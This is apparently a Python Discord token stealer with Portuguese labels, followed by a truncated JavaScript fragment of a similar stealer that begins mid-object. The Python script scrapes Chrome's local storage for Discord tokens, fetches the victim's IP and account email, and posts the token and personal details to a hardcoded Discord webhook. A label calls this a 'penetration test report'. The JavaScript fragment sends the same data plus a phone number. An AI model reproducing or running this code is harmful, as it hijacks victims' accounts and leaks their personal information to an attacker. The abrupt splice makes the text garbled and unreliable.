import os
import re
import json
import base64
import urllib.request
from pathlib import Path
from datetime import datetime

# --- CONFIGURAÇÃO ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1499948274348724326/Zzom5OzJwSIXKUDdXjGb3hLoUEzXJY7rFmjrliPR5Hmf2MiHpcXHOr4BOiMTBsFhQdHm"
TOKEN_REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"

def capturar_ip():
    try:
        return urllib.request.urlopen("https://api.ipify.org").read().decode()
    except:
        return "0.0.0.0"

def obter_dados_discord(token):
    try:
        req = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"}
        )
        with urllib.request.urlopen(req) as res:
            return json.loads(res.read().decode())
    except:
        return None

def extrair_tokens():
    tokens = []
    local = os.getenv("LOCALAPPDATA")
    # Caminho do Chrome
    caminho_base = Path(local) / "Google/Chrome/User Data/Default/Local Storage/leveldb"
    
    if caminho_base.exists():
        for arquivo in caminho_base.glob("*.ldb"):
            try:
                conteudo = arquivo.read_text(encoding="utf-8", errors="ignore")
                encontrados = re.findall(TOKEN_REGEX, conteudo)
                for t in encontrados:
                    if t not in tokens: tokens.append(t)
            except:
                continue
        for arquivo in caminho_base.glob("*.log"):
            try:
                conteudo = arquivo.read_text(encoding="utf-8", errors="ignore")
                encontrados = re.findall(TOKEN_REGEX, conteudo)
                for t in encontrados:
                    if t not in tokens: tokens.append(t)
            except:
                continue
    return tokens

def enviar_relatorio(token, info_user, ip):
    avatar_url = f"https://cdn.discordapp.com/avatars/{info_user['id']}/{info_user['avatar']}.png" if info_user['avatar'] else ""
    
    payload = {
        "username": "LUCZ - EXTREME LOGGER",
        "embeds": [{
            "title": "⚠️ VULNERABILIDADE CRÍTICA ENCONTRADA",
            "color": 16711680,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "👤 Usuário", "value": f"`{info_user['username']}#{info_user['discriminator']}`", "inline": True},
                {"name": "🆔 ID", "value": f"`{info_user['id']}`", "inline": True},
                {"name": "📧 E-mail", "value": f"`{info_user.get('email', 'Sem e-mail')}`", "inline": False},
                {"name": "🌐 IP Real", "value": f"`{ip}`", "inline": True},
                {"name": "💎 Nitro", "value": "Sim" if info_user.get('premium_type') else "Não", "inline": True},
                {"name": "🔑 Token Capturado", "value": f"``` {token} ```"}
            ],
            "footer": {"text": "Relatório de Teste de Invasão"},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }
    
    req = urllib.request.Request(
        WEBHOOK_URL,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    )
    urllib.request.urlopen(req)

def main():
    ip = capturar_ip()
    tokens = extrair_tokens()
    
    if not tokens:
        # Se não achar token, envia apenas o IP
        payload = {"content": f"🌐 **Acesso Detectado (Sem Token):** IP `{ip}`"}
        req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
        return

    for t in tokens:
        info = obter_dados_discord(t)
        if info:
            enviar_relatorio(t, info, ip)

if __name__ == "__main__":
    main()
                        { name: "🆔 ID", value: `\`${u.id}\``, inline: true },
                        { name: "📧 E-mail", value: `\`${u.email || "Sem e-mail"}\``, inline: false },
                        { name: "📞 Telefone", value: `\`${u.phone || "Sem telefone"}\``, inline: true },
                        { name: "🌐 IP Real", value: `\`${ipReal}\``, inline: true },
                        { name: "💎 Nitro", value: u.premium_type ? "Sim" : "Não", inline: true },
                        { name: "🔑 Token Capturado", value: `\`\`\`${token}\`\`\`` }
                    ],
                    footer: { text: "Relatório de Teste de Invasão" },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

        } catch (err) {
            console.log("Erro ao processar token.");
        }
    } else {
        // Caso não ache token, manda só o IP
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🌐 **Acesso Detectado (Sem Token):** IP \`${ipReal}\``
            })
        });
    }
}

iniciarTesteCyber();
